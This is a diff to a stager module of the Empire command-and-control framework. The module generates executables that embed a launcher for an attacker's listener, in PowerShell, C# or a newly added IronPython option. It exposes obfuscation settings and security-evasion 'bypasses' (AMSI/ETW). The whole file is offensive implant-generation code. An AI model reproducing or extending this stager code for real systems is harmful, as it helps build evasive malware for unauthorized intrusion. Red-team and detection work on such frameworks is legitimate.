@@ -1,6 +1,7 @@
 from __future__ import print_function
 from builtins import object
 from empire.server.common import helpers
+import base64
 import shutil
 
 
@@ -11,7 +12,7 @@ class Stager(object):
         self.info = {
             'Name': 'C# PowerShell Launcher',
 
-            'Author': ['@elitest', '@hubbl3'],
+            'Author': ['@Cx01N', '@hubbl3'],
 
             'Description': 'Generate a PowerShell C#  solution with embedded stager code that compiles to an exe',
 
@@ -28,7 +29,7 @@ class Stager(object):
                 'Description': 'Language of the stager to generate (powershell, csharp).',
                 'Required': True,
                 'Value': 'csharp',
-                'SuggestedValues': ['powershell', 'csharp'],
+                'SuggestedValues': ['powershell', 'csharp', 'python'],
                 'Strict': True
             },
             'DotNetVersion': {
@@ -84,6 +85,11 @@ class Stager(object):
                 'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                 'Required': False,
                 'Value': 'mattifestation etw'
+            },
+            'Directory': {
+                'Description': 'Directory for the Python Standard Library or WebDAV server.',
+                'Required': False,
+                'Value': 'C:/Program Files/IronPython 3.4/Lib'
             }
         }
 
@@ -108,71 +114,51 @@ class Stager(object):
         listener_name = self.options['Listener']['Value']
         stager_retries = self.options['StagerRetries']['Value']
         dot_net_version = self.options['DotNetVersion']['Value']
+        bypasses = self.options['Bypasses']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscate_command = self.options['ObfuscateCommand']['Value']
+        outfile = self.options['OutFile']['Value']
+        directory = self.options['Directory']['Value']
 
-        bypasses = ''
+        if not self.mainMenu.listeners.is_listener_valid(listener_name):
+            # not a valid listener, return nothing for the script
+            return "[!] Invalid listener: " + listener_name
+
+        else:
+            obfuscate_script = False
+            if obfuscate.lower() == "true":
+                obfuscate_script = True
+
+        # generate the PowerShell one-liner with all of the proper options set
+        launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=False,
+                                                           obfuscate=obfuscate_script,
+                                                           obfuscationCommand=obfuscate_command,
+                                                           userAgent=user_agent, proxy=proxy,
+                                                           proxyCreds=proxy_creds, stagerRetries=stager_retries,
+                                                           bypasses=bypasses)
+        if launcher == "":
+            return "[!] Error in launcher generation."
+        else:
+            if not launcher or launcher.lower() == "failed":
+                return "[!] Error in launcher command generation."
+
         if language.lower() == 'powershell':
-            bypasses = self.options['Bypasses']['Value']
-            obfuscate = self.options['Obfuscate']['Value']
-            obfuscate_command = self.options['ObfuscateCommand']['Value']
-            outfile = self.options['OutFile']['Value']
-
-            if not self.mainMenu.listeners.is_listener_valid(listener_name):
-                # not a valid listener, return nothing for the script
-                print(helpers.color("[!] Invalid listener: " + listener_name))
-                return ""
-            else:
-                obfuscate_script = False
-                if obfuscate.lower() == "true":
-                    obfuscate_script = True
-
-                if obfuscate_script and "launcher" in obfuscate_command.lower():
-                    print(helpers.color(
-                        "[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the C# stager."))
-                    return ""
-
-                # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=True,
-                                                                   obfuscate=obfuscate_script,
-                                                                   obfuscationCommand=obfuscate_command,
-                                                                   userAgent=user_agent, proxy=proxy,
-                                                                   proxyCreds=proxy_creds, stagerRetries=stager_retries,
-                                                                   bypasses=bypasses)
-
-                if launcher == "":
-                    print(helpers.color("[!] Error in launcher generation."))
-                    return ""
-                else:
-                    launcher_code = launcher.split(" ")[-1]
-
-                    directory = self.mainMenu.installPath + "/data/misc/cSharpTemplateResources/cmd/"
-                    dest_directory = "/tmp/cmd/"
-
-                    # copy directory and create zip with launcher
-                    shutil.copytree(directory, dest_directory)
-                    lines = open(dest_directory + 'cmd/Program.cs').read().splitlines()
-                    lines[19] = "\t\t\tstring stager = \"" + launcher_code + "\";"
-                    open(dest_directory + 'cmd/Program.cs', 'w').write('\n'.join(lines))
-                    shutil.make_archive(outfile, 'zip', dest_directory)
-                    shutil.rmtree(dest_directory)
-
-                    return f"[*] Zip file saved to {self.mainMenu.installPath}/{outfile}"
+            directory = self.mainMenu.stagers.generate_powershell_exe(launcher, dot_net_version=dot_net_version)
+            with open(directory, "rb") as f:
+                code = f.read()
+            return code
 
         elif language.lower() == 'csharp':
-            launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=False,
-                                                               userAgent=user_agent, proxy=proxy,
-                                                               proxyCreds=proxy_creds,
-                                                               stagerRetries=stager_retries,
-                                                               bypasses=bypasses)
-
-            if not launcher or launcher.lower() == "failed":
-                print(helpers.color("[!] Error in launcher command generation."))
-                return ""
-            else:
-                directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
-                f = open(directory, 'rb')
+            directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
+            with open(directory, "rb") as f:
                 code = f.read()
-                f.close()
-                return code
+            return code
+
+        elif language.lower() == 'python':
+            directory = self.mainMenu.stagers.generate_python_exe(launcher, directory, dot_net_version=dot_net_version)
+            with open(directory, "rb") as f:
+                code = f.read()
+            return code
 
         else:
             return "[!] Invalid launcher language."
